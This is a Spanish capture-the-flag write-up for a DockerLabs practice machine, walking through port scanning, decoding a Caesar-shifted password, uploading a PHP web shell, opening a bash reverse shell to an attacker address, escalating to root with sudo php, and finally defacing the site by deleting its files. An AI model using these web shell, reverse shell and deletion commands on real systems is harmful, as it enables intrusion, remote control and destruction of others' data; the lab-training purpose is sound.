
![[20250825191353.png]]

# Fase de reconocimiento

empezamos con un escaneo básico de puertos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

una vez sabemos los puertos que están abiertos vamos a realizar un segundo escaneo pero esta vez con scripts básicos de nmap para sacar el servicio y la versión que corren por detras 


```bash
nmap -p80,443 -sCV 172.17.0.2 -oN targeted
```
![[20250825191755.png]]

vemos que tenemos los puertos 80 y 443 abiertos y que ambos son http y https por lo que vamos a ver que hay en la web empezando por el puerto 80


![[20250825191845.png]]

por el puerto 80 vemos esta pagina donde hay un archivo backup.txt veamos que contiene

![[20250825191920.png]]

pone que hay un usuario llamado mateo y una contraseña "hdvbfuadcb" pero nos pone que la contraseña esta encriptada con el método de cifrado Cesar. ya que hace referencia a un emperador romano y su cifrado de cambio de letras

utilizamos un decodificador de cifrados y vemos que nos muestra varias posibles combinaciones.

![[20250825192110.png]]

en una de las partes vemos una contraseña que es "easycrxazy" lo cual guardaremos como posible contraseña pero ahora hay que ver donde ponemos esa contraseña 

vamos a la pagina https que esta en el puerto 443 "https://172.17.0.2:443"

![[20250825192347.png]]

vemos una pagina con post y anuncios sobre picadilly abajo de la pagina web vemos esto 

![[20250825192422.png]]

# Fase de explotacion

asi que vamos a tratar de subir un archivo php para inyectar una shell, en nuestra maquina victima creamos un archivo con nombre shell.php y dentro pondremos lo siguiente

```php
<?php system($_GET['cmd']); ?>
```

y ahora subiremos el archivo 

![[20250825192614.png]]

vemos que la pagina nos acepta la subida aunque desde aqui no podemos hacer gran cosa. como es costumbre cuando se suben archivos a una web suele existir un directorio llamado uploads asi que vamos a comprobarlo

ponemos en la URL "https://172.17.0.2/uploads/"

![[20250825192753.png]]

efectivamente tenemos el directorio y dentro esta nuestra shell asi que pinchamos y probamos a lanzar algun codigo de prueba

```bash
https://172.17.0.2/uploads/shell.php?cmd=id
```

![[20250825192834.png]]

vemos que efectivamente tenemos shell así que vamos a lanzarnos una shell por el puerto 443

en nuestra maquina atacante vamos a preparar un puerto 443 para recibir la shell 

```bash
nc -nlvp 443
```

y desde la url ponemos lo siguiente 

```bash
https://172.17.0.2/uploads/shell.php?cmd=bash -c "bash -i %26> /dev/tcp/192.168.1.182/443 0>%261"
```

![[20250825193051.png]]

vemos que hemos recibido la shell correctamente 

# Fase de Post explotación

lo primero será tratar la shell para trabajar mas cómodos 

```bash
script /dev/null -c bash
```

luego pulsamos Ctrl + Z para suspender la shell

luego ponemos en nuestra maquina atacante 
```bash
stty raw -echo; fg
```

y para finalizar escribimos 

```bash
export TERM=xterm
```

ahora si tenemos una shell practica 


lo primero que haremos ya que tenemos el usuario mateo y la contraseña "easycrxazy" va a ser probarlo 

![[20250825193359.png]]

vemos que la contraseña no funciona, la logica me dice que la x de la palabra crxazy esta puesta a posta para molestar asi que probaremos a poner la frase easycrazy sin la x 


![[20250825193518.png]]

ahora si vemos que tenemos shell con el usuario mateo 

# Escalada de privilegios 

como siempre empezamos por el comando 

```bash
sudo -l 
```

![[20250825193607.png]]

vemos que tenemos permisos de sudo con el binario php asi que vamos a revisar en GTFObins que podemos hacer con esto 

![[20250825193647.png]]

probamos a lanzar el script por terminal 

```bash
sudo php -r "system('/bin/bash');"
```

![[20250825193744.png]]

y podemos ver que tenemos acceso como root 


# Extra 

vamos a dejar nuestra firma ya que las maquinas docker labs no tienen bandera todo el proceso esta documentado en la maquina chocolatelovers . en este caso la maquina victima no tiene wget instalado asi que vamos a cambiar el proceso de la firma


ya que tenemos acceso a la pagina web por el puerto 443 donde podemos subir el archivo que queramos vamos a subir el index.html y la imagen de la firma 

luego en la maquina victima vamos al directorio "/var/www/html"

y haremos el siguiente comando 

```bash
mv ./uploads/index.html . && mv ./uploads/panda.png .
```

luego borraremos todo lo demás para dejar solo nuestros archivos 

```bash
rm -r index.php create_post.php picadilly.jpg uploads uploads.php
```

![[20250825195456.png]]

cuando solo tengamos esto vamos al puerto 80 

```bash
cd ../picadilly
```

donde estará el archivo backup.txt lo borramos también 

```bash
rm -r backup.txt
```

y copiamos el index.html y la imagen al directorio actual 

```bash
cp ../html/* .
```


ahora si podemos ir a la pagina web y refrescar

![[20250825195821.png]]

aqui podemos ver nuestra firma.
